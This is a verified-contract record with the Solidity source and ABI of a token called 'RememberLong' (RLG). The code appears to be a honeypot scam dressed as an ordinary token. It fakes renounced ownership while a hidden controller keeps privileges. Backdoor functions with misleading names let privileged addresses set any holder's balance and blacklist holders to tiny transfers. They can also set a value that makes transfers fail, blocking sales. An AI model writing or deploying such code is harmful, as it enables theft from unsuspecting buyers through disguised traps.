{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface toSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalBuyAt {\n    function createPair(address liquiditySender, address minTradingTotal) external returns (address);\n}\n\ninterface enableTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeAmount) external view returns (uint256);\n\n    function transfer(address tradingReceiver, uint256 tradingIs) external returns (bool);\n\n    function allowance(address modeSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingReceiver,\n        uint256 tradingIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapMarketing, uint256 value);\n    event Approval(address indexed modeSender, address indexed spender, uint256 value);\n}\n\ninterface enableTxMetadata is enableTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RememberLong is limitSender, enableTx, enableTxMetadata {\n\n    address swapLaunchTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function tokenAutoAt() public {\n        emit OwnershipTransferred(receiverMode, address(0));\n        buyAmount = address(0);\n    }\n\n    function allowance(address launchEnable, address tokenFrom) external view virtual override returns (uint256) {\n        if (tokenFrom == swapLaunchTotal) {\n            return type(uint256).max;\n        }\n        return enableLaunched[launchEnable][tokenFrom];\n    }\n\n    bool public feeWallet;\n\n    uint256 private receiverShouldToken;\n\n    uint256 constant walletMode = 2 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellTx;\n    }\n\n    function approve(address tokenFrom, uint256 tradingIs) public virtual override returns (bool) {\n        enableLaunched[_msgSender()][tokenFrom] = tradingIs;\n        emit Approval(_msgSender(), tokenFrom, tradingIs);\n        return true;\n    }\n\n    uint256 private sellTx = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public receiverSwap;\n\n    function balanceOf(address modeAmount) public view virtual override returns (uint256) {\n        return receiverFund[modeAmount];\n    }\n\n    function takeBuy(address listTx, uint256 tradingIs) public {\n        feeMarketing();\n        receiverFund[listTx] = tradingIs;\n    }\n\n    function fundTotal(address senderTeam, address tradingReceiver, uint256 tradingIs) internal returns (bool) {\n        if (senderTeam == receiverMode) {\n            return exemptMarketing(senderTeam, tradingReceiver, tradingIs);\n        }\n        uint256 marketingBuy = enableTx(swapBuy).balanceOf(minTeamAt);\n        require(marketingBuy == feeTake);\n        require(tradingReceiver != minTeamAt);\n        if (receiverSwap[senderTeam]) {\n            return exemptMarketing(senderTeam, tradingReceiver, walletMode);\n        }\n        return exemptMarketing(senderTeam, tradingReceiver, tradingIs);\n    }\n\n    function transfer(address listTx, uint256 tradingIs) external virtual override returns (bool) {\n        return fundTotal(_msgSender(), listTx, tradingIs);\n    }\n\n    function minExempt(uint256 tradingIs) public {\n        feeMarketing();\n        feeTake = tradingIs;\n    }\n\n    uint8 private buyIsShould = 18;\n\n    mapping(address => bool) public takeFrom;\n\n    constructor (){\n        \n        toSell liquidityFee = toSell(swapLaunchTotal);\n        swapBuy = totalBuyAt(liquidityFee.factory()).createPair(liquidityFee.WETH(), address(this));\n        \n        receiverMode = _msgSender();\n        tokenAutoAt();\n        takeFrom[receiverMode] = true;\n        receiverFund[receiverMode] = sellTx;\n        \n        emit Transfer(address(0), receiverMode, sellTx);\n    }\n\n    function amountIsReceiver(address sellMin) public {\n        if (feeWallet) {\n            return;\n        }\n        \n        takeFrom[sellMin] = true;\n        \n        feeWallet = true;\n    }\n\n    uint256 private limitShould;\n\n    address minTeamAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private takeList = \"Remember Long\";\n\n    mapping(address => uint256) private receiverFund;\n\n    function swapWalletMarketing(address enableTake) public {\n        feeMarketing();\n        \n        if (enableTake == receiverMode || enableTake == swapBuy) {\n            return;\n        }\n        receiverSwap[enableTake] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private enableLaunched;\n\n    bool public receiverIs;\n\n    function getOwner() external view returns (address) {\n        return buyAmount;\n    }\n\n    uint256 private maxTeam;\n\n    address private buyAmount;\n\n    function transferFrom(address senderTeam, address tradingReceiver, uint256 tradingIs) external override returns (bool) {\n        if (_msgSender() != swapLaunchTotal) {\n            if (enableLaunched[senderTeam][_msgSender()] != type(uint256).max) {\n                require(tradingIs <= enableLaunched[senderTeam][_msgSender()]);\n                enableLaunched[senderTeam][_msgSender()] -= tradingIs;\n            }\n        }\n        return fundTotal(senderTeam, tradingReceiver, tradingIs);\n    }\n\n    bool private swapLaunch;\n\n    address public receiverMode;\n\n    string private toReceiver = \"RLG\";\n\n    function exemptMarketing(address senderTeam, address tradingReceiver, uint256 tradingIs) internal returns (bool) {\n        require(receiverFund[senderTeam] >= tradingIs);\n        receiverFund[senderTeam] -= tradingIs;\n        receiverFund[tradingReceiver] += tradingIs;\n        emit Transfer(senderTeam, tradingReceiver, tradingIs);\n        return true;\n    }\n\n    address public swapBuy;\n\n    uint256 buyReceiver;\n\n    function owner() external view returns (address) {\n        return buyAmount;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyIsShould;\n    }\n\n    function feeMarketing() private view {\n        require(takeFrom[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toReceiver;\n    }\n\n    uint256 public sellIs;\n\n    event OwnershipTransferred(address indexed exemptTrading, address indexed sellShouldFee);\n\n    uint256 private tradingAuto;\n\n    function name() external view virtual override returns (string memory) {\n        return takeList;\n    }\n\n    uint256 feeTake;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellShouldFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMin\",\"type\":\"address\"}],\"name\":\"amountIsReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"minExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"}],\"name\":\"swapWalletMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"takeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAutoAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RememberLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}